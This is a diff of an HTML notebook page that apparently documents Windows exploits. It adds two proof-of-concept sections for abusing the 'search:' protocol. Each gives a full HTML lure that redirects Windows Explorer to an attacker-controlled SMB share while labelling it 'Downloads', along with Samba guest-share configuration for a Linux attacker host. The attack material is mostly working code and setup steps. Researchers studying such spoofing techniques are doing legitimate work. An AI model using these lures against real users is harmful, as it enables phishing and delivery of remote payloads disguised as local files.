@@ -89,7 +89,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/index.html"><strong aria-hidden="true">1.</strong> GitHub File Upload Exploit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/The_Exploit.html"><strong aria-hidden="true">1.1.</strong> The Exploit</a></li><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/Analysis.html"><strong aria-hidden="true">1.2.</strong> Analysis</a></li></ol></li><li class="chapter-item expanded "><a href="UAC_Bypass/index.html"><strong aria-hidden="true">2.</strong> UAC Bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="UAC_Bypass/UACMe.html"><strong aria-hidden="true">2.1.</strong> UACMe</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/UACMe_Setup.html"><strong aria-hidden="true">2.2.</strong> UACMe Setup</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_fodhelper.exe_Exploit.html"><strong aria-hidden="true">2.3.</strong> Manual fodhelper.exe Exploit</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_sdclt.exe_Exploit.html"><strong aria-hidden="true">2.4.</strong> Manual sdclt.exe Exploit</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_computerdefaults.exe_Exploit.html"><strong aria-hidden="true">2.5.</strong> Manual computerdefaults.exe Exploit</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Task_Scheduler.html"><strong aria-hidden="true">2.6.</strong> Task Scheduler</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Silent_Cleanup_Task.html"><strong aria-hidden="true">2.7.</strong> Silent Cleanup</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Dot_Net_Profiler_DLL_Loading.html"><strong aria-hidden="true">2.8.</strong> .NET Profiler DLL Loading</a></li></ol></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/index.html"><strong aria-hidden="true">3.</strong> Windows Search Exploit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="Windows_Search_Exploit/Explanation.html"><strong aria-hidden="true">3.1.</strong> Explanation</a></li><li class="chapter-item expanded "><a href="Evil_Txt_File/Explanation.html"><strong aria-hidden="true">3.2.</strong> Explanation</a></li><li class="chapter-item expanded "><a href="Evil_Txt_File/Analysis.html"><strong aria-hidden="true">3.3.</strong> Analysis</a></li></ol></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/index.html"><strong aria-hidden="true">1.</strong> GitHub File Upload Exploit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/The_Exploit.html"><strong aria-hidden="true">1.1.</strong> The Exploit</a></li><li class="chapter-item expanded "><a href="GitHub_File_Upload_Exploit/Analysis.html"><strong aria-hidden="true">1.2.</strong> Analysis</a></li></ol></li><li class="chapter-item expanded "><a href="UAC_Bypass/index.html"><strong aria-hidden="true">2.</strong> UAC Bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="UAC_Bypass/UACMe.html"><strong aria-hidden="true">2.1.</strong> UACMe</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/UACMe_Setup.html"><strong aria-hidden="true">2.2.</strong> UACMe Setup</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_fodhelper.exe_Exploit.html"><strong aria-hidden="true">2.3.</strong> Manual fodhelper.exe Exploit</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_sdclt.exe_Exploit.html"><strong aria-hidden="true">2.4.</strong> Manual sdclt.exe Exploit</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Manual_computerdefaults.exe_Exploit.html"><strong aria-hidden="true">2.5.</strong> Manual computerdefaults.exe Exploit</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Task_Scheduler.html"><strong aria-hidden="true">2.6.</strong> Task Scheduler</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Silent_Cleanup_Task.html"><strong aria-hidden="true">2.7.</strong> Silent Cleanup</a></li><li class="chapter-item expanded "><a href="UAC_Bypass/Dot_Net_Profiler_DLL_Loading.html"><strong aria-hidden="true">2.8.</strong> .NET Profiler DLL Loading</a></li></ol></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/index.html"><strong aria-hidden="true">3.</strong> Windows Search Exploit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="Windows_Search_Exploit/Explanation.html"><strong aria-hidden="true">3.1.</strong> Explanation</a></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/PoC.html"><strong aria-hidden="true">3.2.</strong> PoC</a></li><li class="chapter-item expanded "><a href="Windows_Search_Exploit/PoC_Linux.html"><strong aria-hidden="true">3.3.</strong> PoC-Linux</a></li></ol></li><li class="chapter-item expanded "><a href="Evil_Txt_File/index.html"><strong aria-hidden="true">4.</strong> Evil.txt</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="Evil_Txt_File/Explanation.html"><strong aria-hidden="true">4.1.</strong> Explanation</a></li><li class="chapter-item expanded "><a href="Evil_Txt_File/Analysis.html"><strong aria-hidden="true">4.2.</strong> Analysis</a></li></ol></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -591,6 +591,132 @@ Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 <pre><code>reg delete HKEY_CLASSES_ROOT\search /f
 reg delete HKEY_CLASSES_ROOT\search-ms /f
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="poc"><a class="header" href="#poc">PoC</a></h1>
+<h2 id="victims-machine"><a class="header" href="#victims-machine">Victim's Machine</a></h2>
+<ul>
+<li>OS - Windows 10 1909</li>
+<li>Build - 18363.1139</li>
+</ul>
+<h2 id="attackers-machine"><a class="header" href="#attackers-machine">Attacker's Machine</a></h2>
+<ul>
+<li>OS - Windows 10 1909</li>
+<li>Build - 18363.1139</li>
+</ul>
+<h2 id="setting-up"><a class="header" href="#setting-up">Setting Up</a></h2>
+<h4 id="attackers-machine-1"><a class="header" href="#attackers-machine-1">Attacker's Machine</a></h4>
+<ul>
+<li>There is a SMB share set up on the attacker's machine.</li>
+<li>The files are accessible to everyone on the network.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240708021919.png" alt="" /></li>
+<li>For testing purposes, there is a text file ( Hello.txt )  in the folder.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240708024507.png" alt="" /></li>
+</ul>
+<h4 id="victims-machine-1"><a class="header" href="#victims-machine-1">Victim's Machine</a></h4>
+<ul>
+<li>The victim machine has a HTML file designed to open up the payload on the attackers machine and disguise it as a local file.</li>
+<li>The HTML file</li>
+</ul>
+<pre><code class="language-HTML">&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;div id="in-page-channel-node-id" data-channel-name="in-page-channel-cnXeD0"&gt;&lt;/div&gt;
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+    &lt;link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"&gt;
+    &lt;meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"&gt;
+    &lt;title&gt;Untitled&lt;/title&gt;
+    &lt;meta http-equiv="refresh" content="0; URL=search:query=Hello.txt&amp;amp;crumb=location:\\Desktop-attacke\smb\&amp;amp;displayname=Downloads"
+    &lt;p&gt;&lt;a href="search:query=Hello.txt&amp;amp;crumb=location:\\Desktop-attacke\smb\&amp;amp;displayname=Downloads"&gt;Hello&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="the-exploit-1"><a class="header" href="#the-exploit-1">The Exploit</a></h2>
+<ul>
+<li>
+<p>Victim opens the HTML file to see a webpage with a popup.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240708023819.png" alt="" /></p>
+</li>
+<li>
+<p>Opening Windows Explorer<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240708024225.png" alt="" /></p>
+<ol>
+<li>Windows has searched for "Hello.txt" .</li>
+<li>It appears as if the file is in "Downloads" .</li>
+<li>The actual location of the file is "\\Desktop-attacke\smb\Hello.txt"  .</li>
+</ol>
+</li>
+<li>
+<p>If the Victim uses a different layout, the actual location will not be visible.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240708024753.png" alt="" /></p>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="poc_linux"><a class="header" href="#poc_linux">PoC_Linux</a></h1>
+<h2 id="victims-machine-2"><a class="header" href="#victims-machine-2">Victim's Machine</a></h2>
+<ul>
+<li>OS - Windows 10 1909</li>
+<li>Build - 18363.1139</li>
+</ul>
+<h2 id="attackers-machine-2"><a class="header" href="#attackers-machine-2">Attacker's Machine</a></h2>
+<ul>
+<li>OS - Ubuntu noble 24.04 x86_64</li>
+<li>Kernel - Linux 6.8.0-35-generic</li>
+</ul>
+<h2 id="setting-up-1"><a class="header" href="#setting-up-1">Setting Up</a></h2>
+<h4 id="attackers-machine-3"><a class="header" href="#attackers-machine-3">Attacker's Machine</a></h4>
+<ul>
+<li>A SMB share needs to be setup on the Attacker's machine.</li>
+<li>The shared folder should be accessible by guests.</li>
+<li>SMB version needs to be forces between 2 and 3.</li>
+</ul>
+<pre><code class="language-Text">client min protocol = SMB2
+client max protocol = SMB3
+</code></pre>
+<ul>
+<li>The shared folder needs to be set to guest mode.</li>
+</ul>
+<pre><code class="language-Text">[Share]
+path = /home/share
+public = yes
+guest only = yes
+force create mode = 0666
+force directory mode = 0777
+browseable = yes
+</code></pre>
+<ul>
+<li>For testing purposes, there is a text file ( Hacked.txt )  in the folder.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240722004846.png" alt="" /></li>
+</ul>
+<h4 id="victims-machine-3"><a class="header" href="#victims-machine-3">Victim's Machine</a></h4>
+<ul>
+<li>The victim machine has a HTML file designed to open up the payload on the attackers machine and disguise it as a local file.</li>
+<li>The HTML file</li>
+</ul>
+<pre><code class="language-HTML">&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;div id="in-page-channel-node-id" data-channel-name="in-page-channel-cnXeD0"&gt;&lt;/div&gt;
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+    &lt;link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"&gt;
+    &lt;meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"&gt;
+    &lt;title&gt;Untitled&lt;/title&gt;
+    &lt;meta http-equiv="refresh" content="0; URL=search:query=hacked&amp;amp;crumb=location:\\x-VBOX\Share&amp;amp;displayname=Downloads"
+    &lt;p&gt;&lt;a href="search:query=hacked&amp;amp;crumb=location:\\x-VBOX\Share\&amp;amp;displayname=Downloads"&gt;Untitled&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="the-exploit-2"><a class="header" href="#the-exploit-2">The Exploit</a></h2>
+<ul>
+<li>Victim opens the HTML file to see a webpage with a popup.<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240722005020.png" alt="" /></li>
+<li>Opening Windows Explorer<img src="Windows_Search_Exploit/Attachments/Pasted%20image%2020240722005156.png" alt="" />
+<ol>
+<li>Windows has searched for "hacked" .</li>
+<li>It appears as if the file is in "Downloads" .</li>
+</ol>
+</li>
+</ul>
+<h2 id="notes-6"><a class="header" href="#notes-6">Notes</a></h2>
+<ul>
+<li>Http servers didn't work for the exploit. Cannot access the files through windows explorer.</li>
+<li>Default linux Samba shares are not detected by windows as they use SMB1. SMB V2 &amp; V3 needs to be forced in settings.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="eviltxt"><a class="header" href="#eviltxt">Evil.txt</a></h1>
+<ul>
+<li><a href="Evil_Txt_File/./Explanation.html">Explanation</a></li>
+<li><a href="Evil_Txt_File/./Analysis.html">Analysis</a></li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="explanation-2"><a class="header" href="#explanation-2">Explanation</a></h1>
 <h3 id="technical-details"><a class="header" href="#technical-details">Technical Details</a></h3>
 <ul>
